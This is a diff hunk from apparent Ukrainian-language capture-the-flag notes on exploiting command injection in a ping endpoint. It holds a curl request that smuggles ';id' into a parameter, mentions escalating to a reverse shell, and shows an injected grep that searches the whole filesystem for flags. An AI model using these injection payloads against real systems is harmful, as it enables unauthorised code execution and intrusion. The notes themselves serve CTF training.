@@ -51,4 +51,4 @@ curl "http://$TARGET/ping?ip=127.0.0.1%3Bid"
 - Вивід `uid=...` у відповіді → RCE підтверджено.
 - Blind (нема виводу) → sleep/ping/curl для підтвердження, потім reverse shell.
 - Одразу пошук флагів через RCE:
-  `; grep -raoHE 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\{[[:alnum:]_]+\}:[0-9]+' / 2>/dev/null`
+  `; grep -raoHE 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\{[[:alnum:]_]+\}:[A-Za-z0-9]+' / 2>/dev/null`
